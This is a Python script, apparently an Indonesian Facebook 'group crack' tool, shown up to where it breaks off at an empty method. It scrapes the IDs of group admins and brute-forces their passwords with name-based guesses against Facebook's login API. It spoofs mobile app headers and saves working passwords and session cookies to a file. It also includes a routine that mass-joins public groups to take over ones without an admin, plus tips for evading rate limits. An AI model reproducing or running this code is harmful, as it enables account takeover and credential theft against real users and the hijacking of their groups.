import re, os, sys, time, random, json, uuid, base64, requests

from concurrent.futures import ThreadPoolExecutor as Modol
from rich.progress import Progress, TextColumn
from bs4 import BeautifulSoup as par

from rich.panel import Panel
from rich import print as prints
from rich.tree import Tree

from hitaci.menu import Natural

M = '\x1b[1;91m' # MERAH
N = '\x1b[0m'    # WARNA MATI
K = '\x1b[1;93m' # KUNING
H = '\x1b[1;92m' # HIJAU

class YoWaimo:

    def __init__(self, o):
        self.ses = requests.Session()
        self.idd, self.con = [], 0
        self.ber, self.gag = [], []
        self.die, self.pri, self.ser = 0, [], o
        self.url = "https://mbasic.facebook.com"
        try:self.cookie = {"cookie": open(".cok.txt", "r").read()};self.nama, self.user = open(".tok.txt", "r").read().split("|")
        except (FileNotFoundError, ValueError):self.hapus();self.login()

    def hapus(self):
        try:os.remove(".cok.txt")
        except:pass
        try:os.remove(".tok.txt")
        except:pass

    def logo(self):
        if "win" in sys.platform:os.system("cls")
        else:os.system("clear")
        print(f"""
\t        {M}({K}__{M}){N}
\t`\------({M}oo{N})
\t  ||    ({H}__{N})  {self.ser["name_sc"]}
\t  ||w--||           version: {self.ser["version"]}
          -------------------------------------""")

    def login(self):
        self.logo()
        cok = input("[?] cookie : ")
        if cok in ["", " "]:print("\n[!] jangan kosong");time.sleep(2);self.login()
        dat = Natural("").login_cookie({"cookie": cok})
        Natural("").pause(f"[{H}+{N}] sedang mengecek cookie", 5)
        if "berhasil" in dat["stat"]:
            open(".cok.txt", "w").write(cok);open(".tok.txt", "w").write(dat["nama"]+"|"+dat["user"])
            prints(Panel(f"Selamat datang [italic bold green]{dat['nama']}[/] Di Script crack grup fb", style="bold white", width=60))
            exit(f"[{M}!{N}] jalankan ulang perintah nya dengan ketik python cgf.py")
        elif "checkpoint" in dat["stat"]:
            print(f"\n\n[{M}!{N}] Opshh cookie anda chekcpoint:(");time.sleep(2);self.login()
        elif "invalid" in dat["stat"]:
            print(f"\n\n[{M}!{N}] cookie yang anda masukan invalid");time.sleep(2);self.login()
        else:
            print(f"\n\n[{M}!{N}] cookie yang anda masukan invalid");time.sleep(2);self.login()

    def menu(self):
        self.logo()
        data = Natural(self.cookie).login_cookie(self.cookie)
        if "berhasil" in data["stat"]:pass
        else:self.hapus();print(f"\n\n[{M}!{N}] Opshh cookie anda chekcpoint:(");time.sleep(5);self.login()

        print(f"""
    [+] nama : {self.nama}
    [+] user : {self.user}

    [1] crack admin group
    [2] dumps id group fb
    [3] mulai nuyul group
    [4] hapus semua group
    [5] fitur lainnya
    [0] hapus cookie""")
        pil = input("\n\> ")
        if pil in ["", " "]:print("[!] jangan kosong");time.sleep(2);self.menu()
        elif pil in ["1", "01"]:self.crack_admin()
        elif pil in ["2", "02"]:self.carii_group()
        elif pil in ["3", "03"]:self.mulai_nuyul()
        elif pil in ["4", "04"]:self.dump_join()
        elif pil in ["5", "05"]:Natural(self.cookie).menu_lain()
        elif pil in ["0", "00"]:self.hapus();Natural(self.cookie).pause(f"    [{H}+{N}] sedang menghapus cookie", 5);exit("\n    [+] berhasil menghapus cookie")
        else:print("[!] input yang bner kontol");time.sleep(2);self.menu()

    def mulai_nuyul(self):
        print("[>] masukan file yang sudah anda dump.")
        file = input("[?] file: ")
        try:
            self.idd = open(file).read().splitlines()
        except FileNotFoundError:
            exit(f"[!] file {file} tidak ada, silahkan dump terlebih dahulu.")
        tnya = input("[?] apakah ingin memakai cookie akun lain untuk claim grup [Y/t]: ")
        if tnya in ["Y", "y"]:
            print("[!] silahkan masukan cookie akun untuk claim grup")
            kntl = Natural(self.cookie).ganti_akun()
            prints(f"[!] anda menggunakan akun [bold green]{kntl['nama']}[/] untuk claim grup.")
            cook = {"cookie":kntl["coki"]}
        else:
            cook = self.cookie
        self.apaacooaa(cook, file)

    def crack_admin(self):
        prints(Panel("          MASUKAN NAMA GRUP YANG INGIN ANDA CARI\n   GUNAKAN KOMA (,) UNTUK PEMISAH CNTH: DOOD,TERABOX", width=60))
        nama = input("[?] Masukan nama grup: ").split(",")
        for i in nama:
            print("[!] tekan ctrl+C untuk berhenti\n")
            try:self.dump_admin(f"{self.url}/search/groups/?q={i}")
            except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
                exit("[!] kesalahan pada koneksi")
            print();print(f"[*] terkumpul {len(self.idd)} user admin grup");time.sleep(2)
            self.crack_admin_grup()

    def crack_admin_grup(self):
        prints(Panel("[italic green]Proses Crack Sedang Di Mulai, Hidupkan Mode Pesawat Setiap 200 id. Untuk Menghindari Spam[/]", width=60))
        global prog,des
        prog = Progress(TextColumn('{task.description}'))
        des = prog.add_task('', total=len(self.idd))
        with prog:
            with Modol(max_workers=30) as bool:
                for user in self.idd:
                    uid, nama = user.split("<=>")[0], user.split("<=>")[1].lower()
                    depan = nama.split(" ")
                    try:
                        if len(nama) <=5:
                            if len(depan) <=1 or len(depan) <=2:pass
                            else:pwx = [nama, depan[0]+depan[1], depan[0]+"123", depan[0]+"12345"]
                        else:pwx = [nama, depan[0]+depan[1], depan[0]+"123", depan[0]+"12345"]
                        bool.submit(self.mulai_crack, uid, pwx)
                    except:pass
        print()
        exit("crack admin grup selesai")

    def mulai_crack(self, username, pasw):
        prog.update(des, description=f"[[bold blue]DIEE[/]]:[bold cyan]{str(self.die)}[/] LIVE:[bold green]{len(self.ber)}[/] CHEK:[bold yellow]{len(self.gag)}")
        prog.advance(des)
        for password in pasw:
            try:
                ses = requests.Session()
                ua = "[FBAN/"+"FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'[FBAN/EMA;FBLC/en_GB;FBAV/66.0.0.81.74;FBDM/DisplayMetrics{density=2.625, width=1080, height=2186, scaledDensity=2.625, xdpi=409.432, ydpi=406.4};]','[FBAN/EMA;FBLC/km_KH;FBAV/358.0.0.8.62;FBDM/DisplayMetrics{density=3.5, width=1440, height=2987, scaledDensity=3.5, xdpi=554.181, ydpi=551.542};]','[FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/45904160;FBCR/Telenor;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1724;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]','[FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/45904160;FBCR/Telenor;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.orca;FBDV/V2043;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]','[FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/45904160;FBCR/Grameenphone;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/V2043;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]','[FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/45904160;FBCR/Grameenphone;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.orca;FBDV/V2043;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]','[FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/45904160;FBCR/airtel;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/V2043;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]','[FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/45904160;FBCR/airtel;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.orca;FBDV/V2043;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]','[FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/45904160;FBCR/Telenor;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/V2120;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]','[FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/45904160;FBCR/Telenor;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.orca;FBDV/V2120;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]','[FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/45904160;FBCR/Grameenphone;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/V2120;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]','[FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/45904160;FBCR/Grameenphone;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.orca;FBDV/V2120;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]','[FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/45904160;FBCR/airtel;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/V2120;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]','[FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/45904160;FBCR/Telenor;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.orca;FBDV/vivo 1724;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]','[FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/45904160;FBCR/airtel;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.orca;FBDV/V2120;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]','[FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/45904160;FBCR/Telenor;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/V2111;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]','[FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/45904160;FBCR/Telenor;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.orca;FBDV/V2111;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]','[FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/45904160;FBCR/Grameenphone;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/V2027;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]','[FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/45904160;FBCR/Grameenphone;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.orca;FBDV/V2027;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]','[FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/45904160;FBCR/Telenor;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo Y81S;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]','[FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/45904160;FBCR/Telenor;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.orca;FBDV/vivo Y81S;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]','[FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/45904160;FBCR/Grameenphone;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo Y81S;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]','[FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/45904160;FBCR/Grameenphone;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.orca;FBDV/vivo Y81S;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]','[FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/45904160;FBCR/Telenor;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/V2043;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]','[FBAN/FB4A;FBAV/110.1.0.23.107;FBBV/378783593;FBDM/{density=3.0,width=1080,height=2161};FBLC/en_GB;FBRV/0;FBCR/Singtel;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH2201;FBSV/11;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]','[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570978;FBDM/{density=1.5,width=1200,height=1920};FBLC/en_US;FBRV/85070460;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-T580;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570984;FBDM/{density=2.625,width=1080,height=2034};FBLC/en_US;FBRV/85070460;FBCR/altice MEO;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/ONEPLUS A5010;FBSV/7.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/372.1.0.23.107;FBBV/378783593;FBDM/{density=3.0,width=1080,height=2161};FBLC/en_US;FBRV/0;FBCR/Singtel;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH2249;FBSV/11;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]','[FBAN/FB4A;FBAV/86.0.0.19.69;FBBV/34022666;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/;FBMF/condor;FBBD/condor;FBPN/com.facebook.katana;FBDV/PGN605;FBSV/5.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/911.0.0.5.63;FBBV/4729936;FBDM/{density=1.0, width=768, height=1381};FBLC/en_GB;FBCR/Etisalat NG;FBMF/Oppo;FBBD/Oppo A16;FBPN/com.facebook.katana;FBDV/Oppo A16;FBSV/1.0;FBOP/31;FBCA/x86:armeabi-v7a;]"
                head = {"User-Agent":ua,"Accept-Encoding":"gzip, deflate","Connection":"keep-alive","Content-Type":"application/x-www-form-urlencoded","Host":"graph.facebook.com","X-FB-Net-HNI":str(random.randint(3e7,4e7)),"X-FB-SIM-HNI":str(random.randint(2e4,4e4)),"X-FB-Connection-Type":"MOBILE.LTE","Authorization":"OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895","X-FB-Connection-Quality":"MOBILE.LTE","X-FB-Connection-Bandwidth":str(random.randint(3e7,4e7)),"X-Tigon-Is-Retry":"False","x-fb-session-id":"nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group":"5120","X-FB-Friendly-Name":"ViewerReactionsMutation","X-FB-Request-Analytics-Tags":"graphservice","X-FB-HTTP-Engine":"Liger","X-FB-Client-IP":"True","X-FB-Server-Cluster":"True","x-fb-connection-token":"d29d67d37eca387482a8a5b740f84f62"}
                data = {"adid":str(uuid.uuid4()),"format":"json","device_id":str(uuid.uuid4()),"cpl":"true","family_device_id":str(uuid.uuid4()),"credentials_type":"device_based_login_password","error_detail_type":"button_with_disabled","source":"register_api","email":username,"password":password,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta":"NO_FILE","advertiser_id":str(uuid.uuid4()),"currently_logged_in_userid":"0","locale":"it_IT","client_country_code":"IT","method":"auth.login","fb_api_req_friendly_name":"authenticate","fb_api_caller_class":"com.facebook.account.login.protocol.Fb4aAuthHandler","api_key":"882a8490361da98702bf97a021ddc14d"}
                po = ses.post('https://b-graph.facebook.com/auth/login',data=data,headers=head)
                anjg = json.loads(po.text)
                if "session_key" in ses.cookies.get_dict():
                    cokz = ";".join(i["name"]+"="+i["value"] for i in anjg["session_cookies"])
                    ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                    coki = f"sb={ssbb};{cokz}"
                    tree = Tree("")
                    tree.add(f"[bold green]{username}|{password}")
                    tree.add(f"[bold green]{coki}")
                    prints(tree)
                    kntl = (f"[✓] {username}|{password}|{coki}")
                    self.ber.append(kntl)
                    with open("cgf_ok.txt", "a", encoding="utf-8") as r:
                        r.write(kntl+"\n")
                    break
                elif "checkpoint" in ses.cookies.get_dict():
                    tree = Tree("")
                    tree.add(f"[bold yellow]{username}|{password}")
                    prints(tree)
                    kntl = (f"[×] {username}|{password}")
                    self.gag.append(kntl)
                    with open("cgf_cp.txt", "a", encoding="utf-8") as r:
                        r.write(kntl+"\n")
                    break
            except requests.exceptions.ConnectionError:
                prog.update(des, description=f"[[bold red]SPAM[/]]:[bold cyan]{str(self.die)}[/] LIVE:[bold green]{len(self.ber)}[/] CHEK:[bold yellow]{len(self.gag)}")
                prog.advance(des)
                time.sleep(5)
            #except Exception as e:print(e)
        self.die+=1

    def dump_admin(self, url):
        try:
            link = self.ses.get(url, cookies=self.cookie).text
            if "Anda Diblokir Sementar" in str(link):print(f"\n[{M}!{N}] facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun");exit()
            elif "Perlambat untuk Terus Menggunakan Fitur Ini" in str(link):print(f"\n[{M}!{N}] facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun");exit()
            cari = re.findall('<a\s+href="([^"]+)"><div class\=\".*?"><div class\=\".*?">([^<]+)</div>', str(link))
            for x in cari:
                if "groups" in x[0]:
                    xx =self.ses.get(f"{self.url}/groups/{re.search('groups/(.*?)/', x[0]).group(1)}?view=members", cookies=self.cookie)
                    if "Admin dan Moderator" in str(xx.text):
                        carz = re.findall('<h3><a class\=\".*?" href="(.*?)">(.*?)</a></h3>', xx.text)
                        for i in carz:
                            if "profile.php?" in i[0]:
                                self.idd.append(re.findall("id=(.*?)&amp;eav", i[0])[0]+"<=>"+i[1])
                            else:self.idd.append(re.findall("/(.*?)\?eav", i[0])[0]+"<=>"+i[1])
                    else:continue
                else:continue
                sys.stdout.write(f"\r[+] sedang mengumpulkan {str(len(self.idd))} user admin grup...");sys.stdout.flush()
            if "Lihat Hasil Selanjutnya" in link:
                self.dump_admin(par(link, "html.parser").find("a", string="Lihat Hasil Selanjutnya").get("href"))
        except:pass

    def carii_group(self):
        prints(Panel("          MASUKAN NAMA GRUP YANG INGIN ANDA CARI\n   GUNAKAN KOMA (,) UNTUK PEMISAH CNTH: DOOD,TERABOX", width=60))
        nama = input("[?] Masukan nama grup: ").split(",")
        file = input("[?] Masukan nama file: ")
        print("[!] tekan ctrl+C untuk berhenti\n")
        for i in nama:
            try:self.dump_grup(f"{self.url}/search/groups/?q={i}", file)
            except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
                exit("[!] kesalahan pada koneksi")
        print(f"\n[*] berhasil dump id...\n[>] hasil dump tersimpan di: {file}")

    def dump_grup(self, url, file):
        try:
            link = self.ses.get(url, cookies=self.cookie).text
            if "Anda Diblokir Sementar" in str(link):print(f"\n[{M}!{N}] facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun");exit()
            elif "Perlambat untuk Terus Menggunakan Fitur Ini" in str(link):print(f"\n[{M}!{N}] facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun");exit()
            for yxz in re.findall("groups/(\d+)/", link):
                if len(yxz) == 0: pass
                else:
                    if yxz in self.idd: pass
                    else:
                        self.idd.append(yxz)
                        sys.stdout.write(f"\r[+] sedang mengumpulkan {str(len(self.idd))} grup facebook..");sys.stdout.flush()
                        open(file, "a").write(yxz+"\n")
            if "Lihat Hasil Selanjutnya" in link:
                self.dump_grup(par(link, "html.parser").find("a", string="Lihat Hasil Selanjutnya").get("href"), file)
        except:pass

    def apaacooaa(self, cook, file):
        print(f"[*] total dump id {str(len(self.idd))}")
        prints(Panel("               SEDANG MENGECEK ADMIN GRUP", width=60))
        for user in self.idd:
            self.mulai_cari(user, cook)
        print("\n\n[✓] nuyul grup telah selesai..")
        hpss = input("[?] apakah anda ingin menghapus hasil dump [Y/t]: ")
        if hpss in ["Y", "y"]:
            try:os.remove(file)
            except:pass
            exit("\n\n[✓] berhasil menghapus file dump.")
        else:exit()

    def mulai_cari(self, usr, cok):
        self.con+=1
        print(f"\r[{M}{str(self.con)}{N}] < run ids                                                 ", end="\r")
        try:
            apcb = self.ses.get(f"{self.url}/groups/{usr}?view=members", cookies=cok)
            if "Anda Diblokir Sementar" in str(apcb.text):print(f"\n[{M}!{N}] facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun")
            elif "Halaman yang diminta tidak bisa ditampilkan sekarang. Halaman tersebut mungkin tak tersedia sementara, tautan yang diklik mungkin sudah rusak atau kedaluwarsa, atau Anda tidak memiliki izin untuk melihat halaman ini." in str(apcb.text):pass
            elif "Konten Tidak Ditemukan" in str(apcb.text):pass
            elif "Admin dan Moderator" in str(apcb.text):pass
            else:
                user = re.findall("c_user=(.*?);", str(cok))[0]
                link = self.ses.get(f"https://web.facebook.com/groups/{usr}", cookies=cok)
                if 'checkpoint' in str(link):exit("akun anda checkpoint, silahkan ganti akun")
                data = {'av': user, '__user': user, '__a': '1', '__req': '13', '__hs': re.search('"haste_session":"(.*?)"', link.text).group(1), 'dpr': '1.5', '__ccg': 'GOOD', '__rev': re.search('{"rev":(.*?)}', link.text).group(1), '__hsi': re.search('"hsi":"(.*?)",',link.text).group(1), '__comet_req': '15', 'fb_dtsg': re.search('"DTSGInitialData",\[\],{"token":"(.*?)"', link.text).group(1), 'jazoest': re.search('&jazoest=(.*?)"', link.text).group(1), 'lsd': re.search('"LSD",\[\],{"token":"(.*?)"', link.text).group(1), '__spin_r': re.search('"__spin_r":(.*?),', link.text).group(1), '__spin_b': 'trunk', '__spin_t': re.search('"__spin_t":(.*?),', link.text).group(1), 'qpl_active_flow_ids': '431626709', 'fb_api_caller_class': 'RelayModern', 'fb_api_req_friendly_name': 'CometGroupRootQuery', 'variables': json.dumps({"groupID":usr,"imageMediaType":"image/x-auto","isChainingRecommendationUnit":False,"scale":1.5,"__relay_internal__pv__GroupsCometEntityMenuChannelsrelayprovider":False,"__relay_internal__pv__GroupsCometGroupChatLazyLoadLastMessageSnippetrelayprovider":False,"__relay_internal__pv__GroupsCometEntityMenuSearchBarEnabledrelayprovider":False,"__relay_internal__pv__GlobalPanelEnabledrelayprovider":False}), 'server_timestamps': 'true', 'doc_id': '6182312131895393'}
                head = {'authority': 'web.facebook.com', 'accept': '*/*', 'accept-language': 'id,id-ID;q=0.9,en-US;q=0.8,en;q=0.7', 'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://web.facebook.com', 'referer': link.url, 'sec-ch-prefers-color-scheme': 'dark', 'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"', 'sec-ch-ua-full-version-list': '"Not/A)Brand";v="99.0.0.0", "Google Chrome";v="115.0.5790.102", "Chromium";v="115.0.5790.102"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-model': '""', 'sec-ch-ua-platform': '"Linux"', 'sec-ch-ua-platform-version': '"5.19.0"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36', 'viewport-width': '923', 'x-asbd-id': '129477', 'x-fb-friendly-name': data["fb_api_req_friendly_name"], 'x-fb-lsd': data["lsd"]}
                mmkk = self.ses.post("https://web.facebook.com/api/graphql/", cookies=cok, headers=head, data=data)
                angg = re.findall('{"formatted_count_text":"(.*?)"}', str(mmkk.text).replace("', '", " ").replace("\\u00a0", " ").replace("anggota", ""))[0]
                apaa = re.findall('"text":"Grup (.*?)"}', str(mmkk.text).replace("', '", ""))[0]
                nmgp = re.findall('"name":"(.*?)"', str(mmkk.text).replace("', '", ""))[0]
                if "Publik" in apaa:
                    asuu = self.join_grup(user, data, head, cok, usr)
                    Natural(self.cookie).pause(f"[{M}!{N}] sedang join grup", 10)
                    if "Batasi" in asuu:
                        exit("akun anda terkena limit, silahkan ganti akun")
                    else:
                        kntl = self.jadi_admin(user, usr, cok)
                        Natural(self.cookie).pause(f"[{M}!{N}] mencoba menjadi admin", 10)
                        if "Berhasil" in kntl:
                            prints(Panel(f"""[[bold green]•[/]] Nama grup: [bold green]{nmgp}[/]
[[bold green]•[/]] stat grup: [bold green]{apaa}[/]
[[bold green]•[/]] Anggota  : [bold green]{angg}[/]
[[bold green]•[/]] url grup : [bold green]www.facebook.com/groups/{usr}[/]""", width=60, style="bold white", title="[[bold green] Berhasil Claim [/]]"))
                            open("nuyul_group.txt", "a").write(f"""nama grup: {nmgp}
anggota  : {angg}
type grup: {apaa}
url grup : www.facebook.com/groups/{user}

""")
                            self.ber.append(usr)
                        else:
                            prints(Panel(f"""[[bold red]-[/]] Nama grup: [bold red]{nmgp}[/]
[[bold red]-[/]] stat grup: [bold red]{apaa}[/]
[[bold red]-[/]] Anggota  : [bold red]{angg}[/]
[[bold red]-[/]] url grup : [bold red]www.facebook.com/groups/{usr}[/]""", width=60, style="bold white", title="[[bold red] Gagal Claim [/]]"))
                        self.gag.append(usr)
                else:
                    prints(Panel(f"""[[bold cyan]•[/]] Nama grup: [bold cyan]{nmgp}[/]
[[bold cyan]•[/]] stat grup: [bold cyan]{apaa}[/]
[[bold cyan]•[/]] Anggota  : [bold cyan]{angg}[/]
[[bold cyan]•[/]] url grup : [bold cyan]www.facebook.com/groups/{usr}[/]""", width=60, style="bold white", title="[[bold cyan] Grup Private [/]]"))
        #except Exception as e:print(e)
        except requests.exceptions.ConnectionError:
            prog.update(des, description=f"[bold red]SPAM[/]:{str(self.die)} LIVE:{len(self.ber)} CHEK:{len(self.gag)}")
            prog.advance(des)
            time.sleep(5)

    def join_grup(self, use, dat, hed, cok, usr):
        data = {'av': use, '__user': use, '__a': '1', '__req': '13', '__hs': dat["__hs"], 'dpr': '1.5', '__ccg': 'GOOD', '__rev': dat["__rev"], '__hsi': dat["__hsi"], '__comet_req': '15', 'fb_dtsg': dat["fb_dtsg"], 'jazoest': dat["jazoest"], 'lsd': dat["lsd"], '__spin_r': dat["__spin_r"], '__spin_b': 'trunk', '__spin_t': dat["__spin_t"], 'fb_api_caller_class': 'RelayModern', 'fb_api_req_friendly_name': 'GroupCometJoinForumMutation', 'variables': json.dumps({"feedType":"DISCUSSION","groupID":usr,"imageMediaType":"image/x-auto","input":{"action_source":"GROUP_MALL","attribution_id_v2":"CometGroupDiscussionRoot.react,comet.group,unexpected,1691244310945,990663,2361831622,","group_id":usr,"group_share_tracking_params":{"app_id":"2220391788200892","exp_id":"null","is_from_share":False},"actor_id":use,"client_mutation_id":"3"},"inviteShortLinkKey":"null","isChainingRecommendationUnit":False,"isEntityMenu":True,"scale":1.5,"source":"GROUP_MALL","renderLocation":"group_mall","__relay_internal__pv__GlobalPanelEnabledrelayprovider":False,"__relay_internal__pv__GroupsCometEntityMenuChannelsrelayprovider":False,"__relay_internal__pv__GroupsCometGroupChatLazyLoadLastMessageSnippetrelayprovider":False}), 'server_timestamps': 'true', 'doc_id': '6421289381324591'}
        head = {'authority': 'web.facebook.com', 'accept': '*/*', 'accept-language': 'id,id-ID;q=0.9,en-US;q=0.8,en;q=0.7', 'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://web.facebook.com', 'referer': hed["referer"], 'sec-ch-prefers-color-scheme': 'dark', 'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"', 'sec-ch-ua-full-version-list': '"Not/A)Brand";v="99.0.0.0", "Google Chrome";v="115.0.5790.102", "Chromium";v="115.0.5790.102"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-model': '""', 'sec-ch-ua-platform': '"Linux"', 'sec-ch-ua-platform-version': '"5.19.0"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36', 'viewport-width': '923', 'x-asbd-id': '129477', 'x-fb-friendly-name': data["fb_api_req_friendly_name"], 'x-fb-lsd': data["lsd"]}
        jkww = self.ses.post("https://web.facebook.com/api/graphql/", cookies=cok, headers=head, data=data).text
        if "Akun Anda dibatasi saat ini" in jkww:teks = "Batasi"
        else:teks = "Tidakk"
        return teks

    def jadi_admin(self, user, id_grup, cook):
